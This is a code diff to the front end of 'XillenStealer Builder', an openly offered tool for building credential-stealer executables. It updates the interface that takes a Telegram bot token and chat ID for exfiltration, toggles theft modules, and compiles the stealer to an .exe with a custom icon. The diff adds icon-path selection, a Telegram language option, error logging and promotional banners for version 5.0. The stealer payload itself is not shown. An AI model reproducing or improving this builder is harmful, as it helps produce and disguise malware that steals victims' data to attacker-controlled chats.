@@ -60,7 +60,7 @@ function debounce(func, wait) {
 
 const translations = {
   ru: {
-    'app.title': 'XillenStealer Builder V4.0',
+    'app.title': 'XillenStealer Builder V5.0',
     'nav.create': 'Создать стиллер',
     'nav.builds': 'Мои сборки',
     'nav.settings': 'Настройки',
@@ -347,7 +347,7 @@ const translations = {
     'info.chunk.title': 'Размер чанка',
     'info.chunk.desc': 'Размер блока данных для отправки в Telegram. Больший размер = быстрее передача, но больше нагрузка на сеть.',
     'auth.title': 'XillenStealer Builder',
-    'auth.version': 'v4.0',
+    'auth.version': 'v5.0',
     'auth.login': 'Аутентификация',
     'auth.password': 'Введите пароль для доступа',
     'auth.password.placeholder': 'Пароль',
@@ -361,7 +361,7 @@ const translations = {
     'auth.password.info': 'Пароль указан в репозитории GitHub'
   },
   en: {
-    'app.title': 'XillenStealer Builder V4.0',
+    'app.title': 'XillenStealer Builder V5.0',
     'nav.create': 'Create Stealer',
     'nav.builds': 'My Builds',
     'nav.settings': 'Settings',
@@ -637,7 +637,7 @@ const translations = {
     'info.chunk.title': 'Chunk Size',
     'info.chunk.desc': 'Data block size for sending to Telegram. Larger size = faster transfer, but more network load.',
     'auth.title': 'XillenStealer Builder',
-    'auth.version': 'v4.0',
+    'auth.version': 'v5.0',
     'auth.login': 'Authentication',
     'auth.password': 'Enter password for access',
     'auth.password.placeholder': 'Password',
@@ -1297,19 +1297,16 @@ function getModuleStates() {
   return states;
 }
 
+// Store icon path globally
+let selectedIconPath = null;
+
 async function createStealer() {
   const name = document.getElementById('stealerName').value.trim() || 'XillenStealer';
   const token = document.getElementById('botToken').value.trim();
   const chatId = document.getElementById('chatId').value.trim();
   const sleepTime = document.getElementById('sleepTime').value || '5';
   const chunkSize = document.getElementById('chunkSize').value || '1048576';
-  
-  // Get icon file path
-  const iconFile = document.getElementById('exeIcon').files[0];
-  let iconPath = null;
-  if (iconFile) {
-    iconPath = iconFile.path;
-  }
+  const telegramLanguage = document.getElementById('telegramLanguageSelect')?.value || 'ru';
   
   if (!token || !chatId) {
     showNotification('error', 'Ошибка', 'Заполните токен и ID чата!');
@@ -1322,8 +1319,8 @@ async function createStealer() {
     chat_id: chatId,
     sleep_time: parseInt(sleepTime),
     chunk_size: parseInt(chunkSize),
-    modules: getModuleStates(),
-    icon_path: iconPath
+    telegram_language: telegramLanguage,
+    modules: getModuleStates()
   };
   
   updateStatus('Создание стиллера...');
@@ -1472,7 +1469,7 @@ async function compileToExe(pyPath, name) {
   }, 200);
   
   try {
-    const result = await window.xillen.compileExe(pyPath, name);
+    const result = await window.xillen.compileExe(pyPath, name, selectedIconPath);
     
     clearInterval(progressInterval);
     progressFill.style.width = '100%';
@@ -1489,13 +1486,30 @@ async function compileToExe(pyPath, name) {
     }, 2000);
     
     if (result.status === 'ok') {
+      // Log all output messages
+      if (result.output && Array.isArray(result.output)) {
+        result.output.forEach(msg => {
+          if (msg) log(msg);
+        });
+      }
       log(`<svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Успешно: ${name}.exe создан!`);
       updateStatus('Компиляция завершена');
       showNotification('success', 'Успешно', `Файл ${name}.exe создан!`);
     } else {
+      // Log all error messages
+      if (result.output && Array.isArray(result.output)) {
+        result.output.forEach(msg => {
+          if (msg) log(`✗ ${msg}`);
+        });
+      } else if (result.message) {
+        log(`✗ ${result.message}`);
+      }
       log(`<svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg> Ошибка компиляции!`);
       updateStatus('Ошибка компиляции');
-      showNotification('error', 'Ошибка', 'Ошибка компиляции');
+      const errorMsg = result.output && result.output.length > 0 
+        ? result.output[result.output.length - 1] 
+        : 'Ошибка компиляции';
+      showNotification('error', 'Ошибка', errorMsg);
     }
   } catch (error) {
     clearInterval(progressInterval);
@@ -1613,6 +1627,17 @@ async function checkPassword() {
     console.log('Password check result:', isValid);
     
     if (isValid) {
+      // Показываем плавающий баннер V5.0 при успешном входе
+      const floatingBanner = document.getElementById('floatingBanner');
+      if (floatingBanner) {
+        floatingBanner.classList.add('show');
+        
+        // Автоматически скрываем через 10 секунд
+        setTimeout(() => {
+          floatingBanner.classList.remove('show');
+        }, 10000);
+      }
+      
       document.getElementById('authScreen').style.display = 'none';
       document.getElementById('mainApp').style.display = 'flex';
       showNotification('success', 'Успешно', 'Добро пожаловать!');
@@ -1659,18 +1684,32 @@ function setupEventListeners() {
     document.querySelector('.nav[data-view="builds"]').click();
   });
   
-  // Icon file selection
-  const exeIconInput = document.getElementById('exeIcon');
-  if (exeIconInput) {
-    exeIconInput.addEventListener('change', (e) => {
-      const file = e.target.files[0];
-      const fileNameSpan = document.getElementById('iconFileName');
-      if (file) {
-        fileNameSpan.textContent = file.name;
-        fileNameSpan.style.color = 'var(--accent)';
-      } else {
-        fileNameSpan.textContent = 'Нет файла';
-        fileNameSpan.style.color = 'var(--muted)';
+  // Icon file selection - use dialog to get file path
+  const selectIconBtn = document.getElementById('selectIconBtn');
+  const iconFileNameSpan = document.getElementById('iconFileName');
+  
+  if (selectIconBtn) {
+    selectIconBtn.addEventListener('click', async () => {
+      try {
+        const result = await window.xillen.pickIconFile();
+        if (result && result.filePath) {
+          selectedIconPath = result.filePath;
+          const fileName = result.filePath.split(/[/\\]/).pop();
+          if (iconFileNameSpan) {
+            iconFileNameSpan.textContent = fileName;
+            iconFileNameSpan.style.color = 'var(--accent)';
+          }
+          showNotification('success', 'Иконка выбрана', `Файл: ${fileName}`);
+        } else {
+          selectedIconPath = null;
+          if (iconFileNameSpan) {
+            iconFileNameSpan.textContent = 'Нет файла';
+            iconFileNameSpan.style.color = 'var(--muted)';
+          }
+        }
+      } catch (error) {
+        console.error('Error selecting icon:', error);
+        showNotification('error', 'Ошибка', 'Не удалось выбрать иконку');
       }
     });
   }
@@ -1749,6 +1788,52 @@ document.addEventListener('DOMContentLoaded', () => {
   updateUI(); // Update translations after DOM is loaded
   setupTelegramPreview();
   
+  // Назойливый баннер - не даем закрыть!
+  const bannerClose = document.getElementById('bannerClose');
+  if (bannerClose) {
+    bannerClose.addEventListener('click', (e) => {
+      e.preventDefault();
+      e.stopPropagation();
+      // Показываем уведомление вместо закрытия
+      showNotification('info', 'V5.0 доступна!', 'Переходи на t.me/XillenStealer для получения новой версии!');
+    });
+  }
+  
+  // Плавающий баннер - закрытие
+  const floatingClose = document.getElementById('floatingClose');
+  if (floatingClose) {
+    floatingClose.addEventListener('click', () => {
+      const floatingBanner = document.getElementById('floatingBanner');
+      if (floatingBanner) {
+        floatingBanner.classList.remove('show');
+      }
+    });
+  }
+  
+  // Показываем плавающий баннер через 3 секунды после загрузки
+  setTimeout(() => {
+    const floatingBanner = document.getElementById('floatingBanner');
+    if (floatingBanner && document.getElementById('authScreen').style.display !== 'none') {
+      floatingBanner.classList.add('show');
+      
+      // Автоматически скрываем через 8 секунд
+      setTimeout(() => {
+        floatingBanner.classList.remove('show');
+      }, 8000);
+    }
+  }, 3000);
+  
+  // Периодически показываем баннер каждые 60 секунд
+  setInterval(() => {
+    const floatingBanner = document.getElementById('floatingBanner');
+    if (floatingBanner) {
+      floatingBanner.classList.add('show');
+      setTimeout(() => {
+        floatingBanner.classList.remove('show');
+      }, 8000);
+    }
+  }, 60000);
+  
   // Setup language selector
   const languageSelect = document.getElementById('languageSelect');
   if (languageSelect) {
@@ -1780,6 +1865,7 @@ document.addEventListener('DOMContentLoaded', () => {
   
   log('Система готова к работе');
   log('Интерфейс загружен');
+  log('🔥 V5.0 доступна на t.me/XillenStealer 🔥');
   
   const savedTheme = localStorage.getItem('xillen_theme') || 'deep_dark';
   switchTheme(savedTheme);
